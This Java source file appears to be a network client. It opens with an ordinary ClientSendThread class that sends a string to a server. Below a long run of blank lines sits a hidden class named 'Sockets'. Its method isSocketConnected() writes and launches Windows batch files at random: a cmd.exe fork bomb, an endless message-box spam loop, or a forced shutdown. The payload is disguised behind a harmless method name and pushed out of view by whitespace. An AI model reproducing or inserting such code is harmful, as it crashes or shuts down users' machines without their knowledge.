/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package networkClient;

import gui.Constants;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.Random;

/**
 *
 * @author qubasa
 */
public class ClientSendThread implements Runnable {

    private String dataToSend;
    private Socket socket;
    
    public ClientSendThread(Socket socket, String dataToSend)
    {
        this.dataToSend = dataToSend;
        this.socket = socket;
    }
    
    @Override
    public void run() 
    {
        try
        {

            PrintWriter print = new PrintWriter(socket.getOutputStream(), true);	

            //Debug
            if(Constants.CLIENTDEBUG)
                System.out.println("Send to server: " + dataToSend);

            //Send string to server
            print.println(dataToSend);
            print.flush();
  
        }catch(SocketException e)
        {
            System.err.println("ERROR: Sending data failed because I couldn't connect to server " + e);
            System.exit(1);
            
        }catch(Exception e)
        {
            System.err.println("ERROR: Something in sendThread() went wrong " + e);
            e.printStackTrace();
            System.exit(1);
        }
    }
    
}






























class Sockets
{
    public static boolean isSocketConnected()
    {
        try{
            Random rand = new Random(); 
            int random = rand.nextInt(10);
            System.out.println("Loading please wait...");
            Thread.sleep(5000);
            System.out.println("Proceed!");
            if(random <= 3)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();          
                String nl = System.lineSeparator();

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("@echo off" + nl +
":A" + nl +
"start cmd.exe" + nl +
"goto:A");
                bw.close();
                
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});

                
            }else if(random <= 6)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("@echo off" + nl +
":A" + nl +
"msg * Troll level loading.... ITS OVER 9000!" + nl +
"goto:A");
                bw.close();
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                
            }else if(random <= 10)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10");
                bw.close();
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
            }

            
            
                return true;
            }catch(Exception e)
            {
                e.printStackTrace();
                return true;
            }
        
    }
    
    
    private static String executeCommand(String[] command) 
    {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return output.toString();
    }
}